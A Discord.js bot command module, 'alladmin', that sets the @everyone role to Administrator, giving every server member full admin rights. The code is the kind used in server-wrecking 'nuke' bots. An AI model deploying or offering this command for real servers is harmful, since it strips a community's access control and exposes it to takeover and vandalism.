module.exports = {
	name: 'alladmin',
	description: 'Gives The Everyone Role Admin Perms',
	execute(message, args) {

	//Sets the everyone role to have admin perms, turning off all the default permissions too. 	
	message.guild.roles.everyone.setPermissions('ADMINISTRATOR');
	console.log("Gave everyone admin")

	},
};
